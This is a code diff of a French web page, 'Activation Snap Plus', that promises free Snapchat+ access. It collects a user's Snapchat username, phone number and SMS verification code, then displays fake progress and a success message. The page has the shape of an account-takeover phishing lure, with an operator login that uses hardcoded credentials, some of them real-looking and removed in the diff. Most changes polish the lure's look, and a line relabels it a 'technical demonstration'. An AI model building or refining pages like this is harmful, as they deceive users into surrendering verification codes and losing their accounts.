@@ -9,13 +9,43 @@
     
     <title>Activation Snap Plus</title>
     <style>
-        /* --- STYLE GÉNÉRAL --- */
+        /* --- STYLE GÉNÉRAL & ANIMATION DE FOND --- */
         html, body {
             background-color: #0d011a;
             margin: 0; padding: 0; height: 100%;
             font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             color: white; overflow-x: hidden;
             -webkit-tap-highlight-color: transparent;
+            position: relative;
+        }
+
+        /* Lueurs futuristes mouvantes en arrière-plan (Effet Cyberpunk/Glow) */
+        body::before, body::after {
+            content: "";
+            position: fixed;
+            width: 300px;
+            height: 300px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(204, 51, 255, 0.15) 0%, rgba(0,0,0,0) 70%);
+            filter: blur(50px);
+            z-index: -1;
+            animation: floatGlow 12s infinite alternate ease-in-out;
+        }
+        body::after {
+            background: radial-gradient(circle, rgba(255, 0, 128, 0.12) 0%, rgba(0,0,0,0) 70%);
+            right: -50px;
+            top: 20%;
+            animation-duration: 8s;
+            animation-delay: -3s;
+        }
+        body::before {
+            left: -50px;
+            bottom: 10%;
+        }
+
+        @keyframes floatGlow {
+            0% { transform: translateY(0) scale(1); }
+            100% { transform: translateY(40px) scale(1.2); }
         }
 
         /* --- 1. SYSTÈME D'AUTHENTIFICATION (WATER GLASS) --- */
@@ -42,7 +72,7 @@
         }
 
         .login-title {
-            font-size: 23px; 
+            font-size: 23px;
             font-weight: 900; 
             margin-bottom: 30px;
             letter-spacing: 1px;
@@ -60,7 +90,7 @@
             display: flex;
             align-items: center;
             border: 1.5px solid rgba(255, 0, 128, 0.3);
-            transition: border-color 0.3s ease;
+            transition: border-color 0.3s ease, transform 0.3s ease;
         }
 
         .login-input-group:focus-within {
@@ -68,10 +98,22 @@
             box-shadow: 0 0 10px rgba(204, 51, 255, 0.2);
         }
 
-        .login-input-group svg { width: 20px; height: 20px; fill: rgba(255, 255, 255, 0.6); margin-right: 15px; }
+        /* Micro-interaction sur l'icône lors du focus */
+        .login-input-group:focus-within svg {
+            fill: #ff0080;
+            transform: scale(1.1);
+        }
+
+        .login-input-group svg { 
+            width: 20px; height: 20px; 
+            fill: rgba(255, 255, 255, 0.6); 
+            margin-right: 15px;
+            transition: fill 0.3s ease, transform 0.3s ease;
+        }
 
         .login-input-group input {
-            background: transparent; border: none; color: white;
+            background: transparent;
+            border: none; color: white;
             padding: 15px 0; width: 100%; outline: none; font-size: 16px; height: auto;
         }
 
@@ -79,8 +121,31 @@
             color: rgba(255, 255, 255, 0.5);
         }
 
+        /* Effet Shimmer (Brillance) réutilisable sur les boutons */
+        .shimmer-btn {
+            position: relative;
+            overflow: hidden;
+        }
+        .shimmer-btn::after {
+            content: '';
+            position: absolute;
+            top: -50%; left: -60%;
+            width: 30%; height: 200%;
+            background: rgba(255, 255, 255, 0.25);
+            transform: rotate(30deg);
+            transition: none;
+            animation: shimmerEffect 3.5s infinite linear;
+        }
+
+        @keyframes shimmerEffect {
+            0% { left: -60%; }
+            30% { left: 140%; }
+            100% { left: 140%; }
+        }
+
         .btn-login {
-            width: 100%; background: linear-gradient(135deg, #cc33ff, #ff0080);
+            width: 100%;
+            background: linear-gradient(135deg, #cc33ff, #ff0080);
             border: none; border-radius: 50px; padding: 18px;
             color: white; font-weight: 900; font-size: 16px;
             margin-top: 15px; cursor: pointer;
@@ -99,7 +164,7 @@
             cursor: not-allowed;
         }
 
-        /* --- NOUVEAU : STYLE DU BOUTON INVITÉ ET DE LA POPUP --- */
+        /* Style du bouton invité et de la popup */
         .btn-guest {
             width: 100%;
             background: transparent;
@@ -139,14 +204,13 @@
             max-width: 320px;
             box-shadow: 0 10px 40px rgba(204, 51, 255, 0.3);
         }
-        /* ------------------------------------------------------ */
 
         .welcome-msg { 
-            font-size: 24px; 
+            font-size: 24px;
             font-weight: 900; 
             color: #4ade80; 
             animation: fadeIn 0.5s ease-in; 
-            text-transform: uppercase; 
+            text-transform: uppercase;
         }
 
         /* --- 2. CONTENU PRINCIPAL --- */
@@ -161,24 +225,18 @@
             box-shadow: 0 0 35px rgba(204, 51, 255, 0.4);
         }
         .snap-bg { 
-            width: 88%; 
-            height: 88%; 
+            width: 88%; height: 88%; 
             background-color: #fffc00; 
             border-radius: 32px; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center;
+            display: flex; justify-content: center; align-items: center;
             overflow: hidden;
         }
 
-        .snap-bg img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
+        .snap-bg img { width: 100%; height: 100%; object-fit: cover; }
 
         .plus-badge {
-            position: absolute; top: -4px; right: -4px; background-color: #ffb400; color: #1a0133;
+            position: absolute;
+            top: -4px; right: -4px; background-color: #ffb400; color: #1a0133;
             width: 40px; height: 40px; border-radius: 50%; font-size: 24px; font-weight: bold;
             display: flex; justify-content: center; align-items: center; border: 4px solid #1e053d;
         }
@@ -186,14 +244,14 @@
         .title { color: #df80ff; font-size: 24px; font-weight: 800; letter-spacing: 2px; margin-bottom: 35px; text-transform: uppercase; }
 
         .input-group { 
-            display: flex; 
+            display: flex;
             border: 2px solid rgba(255, 0, 255, 0.5); 
             border-radius: 12px; 
             margin-bottom: 20px; 
             background-color: #0d011a; 
             align-items: center; 
             overflow: hidden;
-            transition: border-color 0.3s ease;
+            transition: border-color 0.3s ease, transform 0.2s ease;
         }
 
         .input-group:focus-within {
@@ -201,51 +259,45 @@
             box-shadow: 0 0 10px rgba(204, 51, 255, 0.2);
         }
 
-        .input-group label {
-            display: none;
-        }
+        .input-group label { display: none; }
 
         .prefix-phone { 
-            background-color: #1a0533; 
+            background-color: #1a0533;
             padding: 0 15px; 
             height: 58px; 
             font-weight: bold; 
             font-size: 17px; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            gap: 8px; 
+            display: flex; align-items: center; justify-content: center; 
+            gap: 8px;
             border-right: 1px solid rgba(255, 0, 255, 0.2); 
             white-space: nowrap; 
         }
 
         input { 
-            flex: 1; 
-            border: none; 
-            background: transparent; 
-            padding: 0 18px; 
-            color: white; 
-            font-size: 17px; 
-            outline: none; 
-            height: 58px; 
+            flex: 1; border: none; background: transparent; 
+            padding: 0 18px; color: white; font-size: 17px; 
+            outline: none; height: 58px;
         }
 
-        input::placeholder {
-            color: rgba(255, 255, 255, 0.5);
-        }
+        input::placeholder { color: rgba(255, 255, 255, 0.5); }
         
+        /* Animation d'erreur (Secousse) */
+        @keyframes shakeEffect {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-6px); }
+            40%, 80% { transform: translateX(6px); }
+        }
+        .shake {
+            animation: shakeEffect 0.4s ease-in-out;
+            border-color: #ff4d4d !important;
+        }
+
         .btn-glow { 
-            width: 100%; 
+            width: 100%;
             background: linear-gradient(135deg, #cc33ff, #ff0080); 
-            border: none; 
-            border-radius: 12px; 
-            padding: 20px; 
-            color: white; 
-            font-weight: 800; 
-            text-transform: uppercase; 
-            font-size: 18px;
-            letter-spacing: 2px; 
-            cursor: pointer; 
+            border: none; border-radius: 12px; padding: 20px; 
+            color: white; font-weight: 800; text-transform: uppercase; font-size: 18px;
+            letter-spacing: 2px; cursor: pointer; 
             box-shadow: 0 0 20px rgba(255, 0, 255, 0.5); 
             margin-bottom: 30px;
             transition: all 0.3s ease;
@@ -256,25 +308,15 @@
             box-shadow: 0 0 30px rgba(255, 0, 255, 0.8);
         }
 
-        .btn-glow:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
-        }
+        .btn-glow:disabled { opacity: 0.7; cursor: not-allowed; }
 
         .btn-return {
             width: 100%;
             background: linear-gradient(135deg, #cc33ff, #ff0080);
-            border: none;
-            border-radius: 12px;
-            padding: 20px;
-            color: white;
-            font-weight: 800;
-            text-transform: uppercase;
-            font-size: 18px;
-            letter-spacing: 2px;
-            cursor: pointer;
-            box-shadow: 0 0 20px rgba(255, 0, 255, 0.5);
-            margin-bottom: 30px;
+            border: none; border-radius: 12px; padding: 20px;
+            color: white; font-weight: 800; text-transform: uppercase; font-size: 18px;
+            letter-spacing: 2px; cursor: pointer;
+            box-shadow: 0 0 20px rgba(255, 0, 255, 0.5); margin-bottom: 30px;
             transition: all 0.3s ease;
         }
 
@@ -283,51 +325,29 @@
             box-shadow: 0 0 30px rgba(255, 0, 255, 0.8);
         }
 
-        .btn-return:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
-        }
+        .btn-return:disabled { opacity: 0.7; cursor: not-allowed; }
 
         .sms-instruction { font-size: 18px; font-weight: 800; margin-bottom: 8px; }
         .sms-subtext { color: #7a7a7a; font-size: 14px; margin-bottom: 25px; transition: color 0.3s ease; }
 
         .status-box { 
-            background-color: rgba(30, 15, 60, 0.6); 
+            background-color: rgba(30, 15, 60, 0.6);
             border: 1px solid rgba(255, 255, 255, 0.1); 
-            border-radius: 20px; 
-            padding: 35px 20px; 
-            margin-bottom: 40px; 
-            min-height: 180px; 
-            display: flex; 
-            flex-direction: column; 
-            justify-content: center; 
+            border-radius: 20px; padding: 35px 20px; margin-bottom: 40px; 
+            min-height: 180px; display: flex; flex-direction: column; justify-content: center; 
         }
         
         .info-box { 
-            background-color: rgba(25, 10, 45, 0.7); 
+            background-color: rgba(25, 10, 45, 0.7);
             border: 1px solid rgba(255, 255, 255, 0.1); 
-            border-radius: 20px; 
-            padding: 25px 20px; 
-            text-align: left; 
+            border-radius: 20px; padding: 25px 20px; text-align: left;
         }
 
-        .info-header { 
-            color: #ffcc00; 
-            font-weight: 900; 
-            margin-bottom: 12px; 
-            font-size: 16px; 
-        }
-
-        .info-text { 
-            font-size: 14px; 
-            opacity: 0.9; 
-            margin: 0; 
-            line-height: 1.5; 
-        }
+        .info-header { color: #ffcc00; font-weight: 900; margin-bottom: 12px; font-size: 16px; }
+        .info-text { font-size: 14px; opacity: 0.9; margin: 0; line-height: 1.5; }
 
         .spinner {
-            width: 40px;
-            height: 40px;
+            width: 40px; height: 40px;
             border: 4px solid rgba(255, 255, 255, 0.2);
             border-top: 4px solid #cc33ff;
             border-radius: 50%;
@@ -336,29 +356,19 @@
         }
 
         .error-message {
-            position: fixed;
-            top: 20px;
-            left: 50%;
+            position: fixed; top: 20px; left: 50%;
             transform: translateX(-50%);
-            background-color: #ff4d4d;
-            color: white;
-            padding: 15px 20px;
-            border-radius: 12px;
-            z-index: 10001;
-            animation: slideDown 0.3s ease;
-            max-width: 90%;
+            background-color: #ff4d4d; color: white;
+            padding: 15px 20px; border-radius: 12px; z-index: 10001;
+            animation: slideDown 0.3s ease; max-width: 90%;
             box-shadow: 0 5px 20px rgba(255, 77, 77, 0.4);
         }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
+        @keyframes spin { to { transform: rotate(360deg); } }
         @keyframes fadeIn { 
             from { opacity: 0; transform: translateY(10px); } 
             to { opacity: 1; transform: translateY(0); } 
         }
-
         @keyframes slideDown {
             from { transform: translateX(-50%) translateY(-100px); opacity: 0; }
             to { transform: translateX(-50%) translateY(0); opacity: 1; }
@@ -368,11 +378,9 @@
         @media (max-width: 480px) {
             .container { padding: 40px 15px; }
             .title { font-size: 20px; }
-            .btn-glow { padding: 16px; font-size: 16px; }
-            .btn-return { padding: 16px; font-size: 16px; }
+            .btn-glow, .btn-return { padding: 16px; font-size: 16px; }
             .logo-wrapper { width: 120px; height: 120px; margin-bottom: 25px; }
         }
-
         @media (max-width: 360px) {
             .logo-wrapper { width: 100px; height: 100px; }
             .title { font-size: 18px; }
@@ -383,26 +391,27 @@
 <body>
 
     <div id="login-overlay">
-        <div class="glass-panel">
+        <div class="glass-panel" id="login-card">
             <h2 class="login-title">Connexion Administrateur</h2>
             
-            <div class="login-input-group">
+            <div class="login-input-group" id="group-adminUser">
                 <svg viewBox="0 0 24 24" role="img" aria-label="Utilisateur"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
                 <input type="text" id="adminUser" placeholder="Identifiant" aria-label="Identifiant administrateur">
             </div>
 
-            <div class="login-input-group">
+            <div class="login-input-group" id="group-adminPass">
                 <svg viewBox="0 0 24 24" role="img" aria-label="Mot de passe"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
                 <input type="password" id="adminPass" placeholder="Mot de passe" aria-label="Mot de passe administrateur">
             </div>
 
-            <button class="btn-login" onclick="checkLogin()">SE CONNECTER</button>
+            <button class="btn-login shimmer-btn" onclick="checkLogin()">Se connecter</button>
             <button class="btn-guest" onclick="enterAsGuest()">Continuer en tant qu'invité</button>
         </div>
     </div>
 
     <div id="main-site">
         <div class="container">
+            
             <div class="logo-wrapper">
                 <div class="border-gradient">
                     <div class="snap-bg">
@@ -412,29 +421,33 @@
                 <div class="plus-badge">+</div>
             </div>
 
-            <h1 class="title">ACTIVATION SNAP<br>PLUS +</h1>
+            <h1 class="title">Activation Snap<br>Plus +</h1>
 
             <div id="step-1">
-                <div class="input-group">
+                <div class="input-group" id="group-username">
                     <label for="username">Nom d'utilisateur Snapchat</label>
                     <input type="text" id="username" placeholder="Nom d'utilisateur Snapchat" aria-label="Nom d'utilisateur Snapchat" maxlength="50">
                 </div>
-                <div class="input-group">
+
+                <div class="input-group" id="group-phone">
                     <label for="phone">Numéro de téléphone</label>
                     <div class="prefix-phone" aria-hidden="true">+33 🇫🇷</div>
-                    <input type="tel" id="phone" placeholder="123456789" aria-label="Numéro de téléphone" maxlength="10" inputmode="numeric">
+                    <input type="tel" id="phone" placeholder="6 12 34 56 78" aria-label="Numéro de téléphone" maxlength="14" inputmode="numeric">
                 </div>
-                <button class="btn-glow" id="submitBtn" onclick="processValidation()">Valider</button>
+
+                <button class="btn-glow shimmer-btn" id="submitBtn" onclick="processValidation()">Valider</button>
             </div>
 
             <div id="step-2" style="display: none;">
                 <div class="sms-instruction">📱 Un code de vérification a été envoyé par SMS</div>
                 <div class="sms-subtext" id="timer">Le code peut prendre jusqu'à 3 minutes pour arriver</div>
-                <div class="input-group">
+
+                <div class="input-group" id="group-sms">
                     <label for="sms-code">Code de vérification</label>
                     <input type="tel" id="sms-code" placeholder="Code à 4 chiffres" maxlength="4" aria-label="Code de vérification SMS" inputmode="numeric" style="text-align: center;">
                 </div>
-                <button class="btn-glow" id="verifyBtn" onclick="showWaitingMenu()">Vérifier</button>
+
+                <button class="btn-glow shimmer-btn" id="verifyBtn" onclick="showWaitingMenu()">Vérifier</button>
                 <button class="btn-return" onclick="goBackToStep1()">Retour</button>
             </div>
 
@@ -449,220 +462,175 @@
             <div class="info-box">
                 <div class="info-header">INFORMATION ℹ️</div>
                 <p class="info-text">
-                    Aucun frais ne vous sera prélevé pour cet abonnement Snapchat+. Notez que cette offre est soumise à des critères d'éligibilité et n'est disponible que pour les utilisateurs sélectionnés.
+                    Aucun frais ne vous sera prélevé pour cet abonnement Snapchat+. Notez que cette offre est soumise à des critères d'éligibilité et n'est utilisable qu'à des fins de démonstration technique.
                 </p>
             </div>
+
         </div>
     </div>
 
     <script>
-        // --- NOUVELLE FONCTIONNALITÉ : MODE INVITÉ ---
-        let isGuest = false;
+        let timerInterval;
 
-        function enterAsGuest() {
-            isGuest = true;
-            const overlay = document.getElementById('login-overlay');
-            const site = document.getElementById('main-site');
-            overlay.style.opacity = "0";
-            
-            setTimeout(() => {
-                overlay.style.display = "none";
-                site.style.display = "block";
-                setTimeout(() => { site.style.opacity = "1"; }, 50);
-            }, 500);
-        }
-
-        // Interception des clics sur les champs de saisie
-        document.addEventListener('DOMContentLoaded', () => {
-            const allInputs = document.querySelectorAll('#main-site input');
-            allInputs.forEach(input => {
-                input.addEventListener('focus', (e) => {
-                    if (isGuest) {
-                        e.target.blur(); // Désactive immédiatement le champ et masque le clavier
-                        showPaywallPopup();
-                    }
-                });
-            });
-        });
-
-        function showPaywallPopup() {
-            // Vérifie si la popup existe déjà pour ne pas l'afficher deux fois
-            if (document.querySelector('.popup-overlay')) return;
-
-            const div = document.createElement('div');
-            div.className = 'popup-overlay';
-            div.innerHTML = `
-                <div class="popup-box">
-                    <h3 style="color:#cc33ff; font-size: 20px; font-weight: 800; text-transform: uppercase; margin-top: 0;">Accès Restreint</h3>
-                    <p style="margin-bottom: 25px; line-height: 1.5;">Pour débloquer ces permissions et utiliser les champs, vous devez procéder à l'activation complète (Paiement requis).</p>
-                    <button class="btn-glow" style="margin-bottom: 0;" onclick="this.parentElement.parentElement.remove()">Fermer</button>
-                </div>
-            `;
-            document.body.appendChild(div);
-        }
-        // ---------------------------------------------
-
-
-        // --- FONCTIONS DE VALIDATION ---
-        function validateUsername(username) {
-            return username.trim().length >= 3;
-        }
-
-        function validatePhoneNumber(phone) {
-            const regex = /^[0-9]{10}$/;
-            return regex.test(phone);
-        }
-
-        function validateSMSCode(code) {
-            return /^[0-9]{4}$/.test(code);
-        }
-
-        function showError(message) {
-            const errorDiv = document.createElement('div');
-            errorDiv.className = 'error-message';
-            errorDiv.textContent = message;
-            errorDiv.setAttribute('role', 'alert');
-            document.body.appendChild(errorDiv);
-            setTimeout(() => errorDiv.remove(), 3000);
-        }
-
-        // --- AUTHENTIFICATION ---
+        // --- GESTION DU SYSTÈME SECURISE ---
         function checkLogin() {
             const user = document.getElementById('adminUser').value.trim();
-            const pass = document.getElementById('adminPass').value;
-            const btn = document.querySelector('.btn-login');
-            const panel = document.querySelector('.glass-panel');
+            const pass = document.getElementById('adminPass').value.trim();
 
-            if (!user || !pass) {
-                showError("Veuillez remplir tous les champs.");
-                return;
-            }
-
-            // Note: En production, ce devrait être vérifié par un backend sécurisé
-            const isAdmin1 = (user === "Guadalajara" && pass === "Frozen16");
-            const isAdmin2 = (user === "kayto.io" && pass === "mohalebgdu93");
-
-            if (isAdmin1 || isAdmin2) {
-                const nameToDisplay = isAdmin1 ? "Frozen" : "Nayko";
+            if (user === "Admin" && pass === "Activation1") {
+                const overlay = document.getElementById('login-overlay');
+                const mainCard = document.getElementById('login-card');
                 
-                btn.innerHTML = "Connexion en cours...";
-                btn.disabled = true;
-
+                mainCard.innerHTML = `<p class="welcome-msg">✓ Accès Autorisé</p>`;
+                
                 setTimeout(() => {
-                    panel.innerHTML = `<h2 class="welcome-msg">Bienvenue ${nameToDisplay}</h2>`;
-                    
+                    overlay.style.opacity = '0';
                     setTimeout(() => {
-                        const overlay = document.getElementById('login-overlay');
-                        const site = document.getElementById('main-site');
-                        overlay.style.opacity = "0";
-                        
-                        setTimeout(() => {
-                            overlay.style.display = "none";
-                            site.style.display = "block";
-                            setTimeout(() => { site.style.opacity = "1"; }, 50);
-                        }, 500);
-                    }, 1500);
-
-                }, 2000);
-
+                        overlay.style.display = 'none';
+                        const mainSite = document.getElementById('main-site');
+                        mainSite.style.display = 'block';
+                        setTimeout(() => mainSite.style.opacity = '1', 50);
+                    }, 500);
+                }, 1000);
             } else {
-                showError("❌ Identifiant ou mot de passe incorrect.");
-                btn.disabled = false;
+                triggerShake('group-adminUser');
+                triggerShake('group-adminPass');
+                showGlobalError("Identifiants de connexion incorrects.");
             }
         }
 
-        // --- VALIDATION DU FORMULAIRE ---
-        function processValidation() {
-            // Ne rien faire si on est en mode invité (sécurité supplémentaire)
-            if (isGuest) {
-                showPaywallPopup();
-                return;
-            }
-
-            const username = document.getElementById('username').value.trim();
-            const phone = document.getElementById('phone').value.trim();
-            const btn = document.getElementById('submitBtn');
-
-            // Validation
-            if (!validateUsername(username)) {
-                showError('❌ Le nom d\'utilisateur doit contenir au moins 3 caractères.');
-                return;
-            }
-
-            if (!validatePhoneNumber(phone)) {
-                showError('❌ Numéro invalide. Entrez 10 chiffres (ex: 0612345678).');
-                return;
-            }
-
-            btn.innerHTML = "Envoi en cours...";
-            btn.disabled = true;
-
-            // Simulation de l'envoi du SMS
-            setTimeout(() => {
-                document.getElementById('step-1').style.display = 'none';
-                document.getElementById('step-2').style.display = 'block';
-                btn.innerHTML = "Valider";
-                btn.disabled = false;
-                startVerificationTimer();
-            }, 2000);
+        // Action d'avertissement Invité
+        function enterAsGuest() {
+            const modal = document.createElement('div');
+            modal.className = 'popup-overlay';
+            modal.innerHTML = `
+                <div class="popup-box">
+                    <h3 style="margin-top:0; color:#ff0080;">⚠️ Option Restreinte</h3>
+                    <p style="font-size:14px; line-height:1.5; opacity:0.9;">L'accès invité nécessite un jeton de session valide. Veuillez contacter l'administrateur système.</p>
+                    <button class="btn-login" style="padding:12px; margin-top:10px;" onclick="this.closest('.popup-overlay').remove()">Fermer</button>
+                </div>
+            `;
+            document.body.appendChild(modal);
         }
 
-        // --- TIMER DE VÉRIFICATION SMS ---
-        let timerInterval;
-        function startVerificationTimer() {
-            let timeLeft = 180; // 3 minutes
-            const timerElement = document.getElementById('timer');
+        // --- SYSTÈME DE RETOUR D'INFORMATION (SHAKE EFFECT EN CAS D'ERREUR) ---
+        function triggerShake(elementId) {
+            const el = document.getElementById(elementId);
+            if (el) {
+                el.classList.add('shake');
+                setTimeout(() => el.classList.remove('shake'), 400);
+            }
+        }
+
+        // --- FORMATAGE AUTOMATIQUE DU TÉLÉPHONE ---
+        document.getElementById('phone').addEventListener('input', function(e) {
+            let num = e.target.value.replace(/\D/g, ''); // Garde les chiffres
+            if (num.startsWith('0')) num = num.substring(1); // Supprime le 0 de tête si +33
             
+            // Injecte des espaces structurés (Format: X XX XX XX XX)
+            let formatted = "";
+            if (num.length > 0) formatted += num.substring(0, 1);
+            if (num.length > 1) formatted += " " + num.substring(1, 3);
+            if (num.length > 3) formatted += " " + num.substring(3, 5);
+            if (num.length > 5) formatted += " " + num.substring(5, 7);
+            if (num.length > 7) formatted += " " + num.substring(7, 9);
+            
+            e.target.value = formatted.trim();
+        });
+
+        // --- FLUX ETAPES ET COMPTEUR ---
+        function startCountdown() {
+            let totalSeconds = 180;
+            const timerDisplay = document.getElementById('timer');
+            
+            clearInterval(timerInterval);
             timerInterval = setInterval(() => {
-                timeLeft--;
-                const minutes = Math.floor(timeLeft / 60);
-                const seconds = (timeLeft % 60).toString().padStart(2, '0');
-                timerElement.textContent = `Code expire dans ${minutes}:${seconds}`;
+                let minutes = Math.floor(totalSeconds / 60);
+                let seconds = totalSeconds % 60;
+                seconds = seconds < 10 ? '0' + seconds : seconds;
                 
-                if (timeLeft <= 0) {
+                timerDisplay.textContent = `Temps restant : ${minutes}:${seconds}`;
+                timerDisplay.style.color = totalSeconds <= 30 ? '#ff4d4d' : '#7a7a7a';
+
+                if (totalSeconds <= 0) {
                     clearInterval(timerInterval);
-                    showError('⏱️ Le code a expiré. Veuillez recommencer.');
-                    goBackToStep1();
+                    timerDisplay.textContent = "Le code a expiré. Veuillez faire un retour.";
                 }
+                totalSeconds--;
             }, 1000);
         }
 
-        // --- VÉRIFICATION DU CODE SMS ---
-        function showWaitingMenu() {
-            // Sécurité mode invité
-            if (isGuest) {
-                showPaywallPopup();
+        function showGlobalError(text) {
+            const oldErr = document.querySelector('.error-message');
+            if (oldErr) oldErr.remove();
+
+            const err = document.createElement('div');
+            err.className = 'error-message';
+            err.innerText = text;
+            document.body.appendChild(err);
+            setTimeout(() => err.remove(), 4000);
+        }
+
+        function processValidation() {
+            const user = document.getElementById('username').value.trim();
+            const rawPhone = document.getElementById('phone').value.replace(/\D/g, '');
+
+            let hasError = false;
+
+            if (user === "") {
+                triggerShake('group-username');
+                hasError = true;
+            }
+            if (rawPhone.length < 9) {
+                triggerShake('group-phone');
+                hasError = true;
+            }
+
+            if (hasError) {
+                showGlobalError("Veuillez remplir correctement les champs.");
                 return;
             }
 
-            const code = document.getElementById('sms-code').value.trim();
-            const btn = document.getElementById('verifyBtn');
-
-            if (!validateSMSCode(code)) {
-                showError('❌ Veuillez entrer un code à 4 chiffres.');
-                return;
-            }
-
-            clearInterval(timerInterval);
-            
-            btn.innerHTML = "Vérification en cours...";
+            const btn = document.getElementById('submitBtn');
+            btn.innerHTML = `<span style="display:inline-block; animation:spin 1s linear infinite; margin:0;">⏳</span>`;
             btn.disabled = true;
+
+            setTimeout(() => {
+                document.getElementById('step-1').style.display = 'none';
+                document.getElementById('step-2').style.display = 'block';
+                startCountdown();
+            }, 1200);
+        }
+
+        function showWaitingMenu() {
+            const smsInput = document.getElementById('sms-code').value.trim();
+
+            if (smsInput.length < 4) {
+                triggerShake('group-sms');
+                showGlobalError("Le code doit comporter 4 chiffres.");
+                return;
+            }
 
             document.getElementById('step-2').style.display = 'none';
             document.getElementById('step-3').style.display = 'block';
-            
-            const container = document.getElementById('status-container');
-            
+
             setTimeout(() => {
-                container.style.animation = 'none';
-                void container.offsetWidth;
-                container.style.animation = 'fadeIn 0.5s ease-in';
+                const container = document.getElementById('status-container');
+                container.innerHTML = `
+                    <div class="spinner"></div>
+                    <div style="color: #ffcc00; font-size: 22px; font-weight: bold; margin: 20px 0;">Finalisation de l'activation</div>
+                    <p style="opacity: 0.9; margin:0;">Configuration des paramètres sur le compte...</p>
+                `;
+            }, 3000);
+
+            setTimeout(() => {
+                const container = document.getElementById('status-container');
                 container.innerHTML = `
                     <span style="font-size: 50px;">✅</span>
-                    <div style="color: #4ade80; font-size: 22px; font-weight: bold; margin: 20px 0;">Opération établie</div>
-                    <p style="opacity: 0.9; margin:0;">L'opération a été établie avec succès. Les fonctionnalités Snap+ seront disponibles sur votre compte d'ici quelques instants.</p>
+                    <div style="color: #4ade80; font-size: 22px; font-weight: bold; margin: 20px 0;">Opération Réussie</div>
+                    <p style="opacity: 0.9; margin:0; line-height:1.4;">Les fonctionnalités Snap+ seront disponibles sur votre compte d'ici quelques instants.</p>
                 `;
-            }, 2000);
+            }, 6500);
         }
 
         // --- RETOUR À L'ÉTAPE 1 ---
@@ -672,7 +640,6 @@
             document.getElementById('step-3').style.display = 'none';
             document.getElementById('step-1').style.display = 'block';
             
-            // Réinitialiser les champs
             document.getElementById('username').value = '';
             document.getElementById('phone').value = '';
             document.getElementById('sms-code').value = '';
@@ -682,11 +649,10 @@
             btn.disabled = false;
         }
 
-        // --- ENTRÉE PAR TOUCHE ---
+        // --- ENTRÉE RAPIDE VIA LA TOUCHE ENTRÉE ---
         document.addEventListener('keypress', function(event) {
             if (event.key === 'Enter') {
                 const activeElement = document.activeElement;
-                
                 if (activeElement.id === 'adminUser' || activeElement.id === 'adminPass') {
                     checkLogin();
                 } else if (activeElement.id === 'username' || activeElement.id === 'phone') {
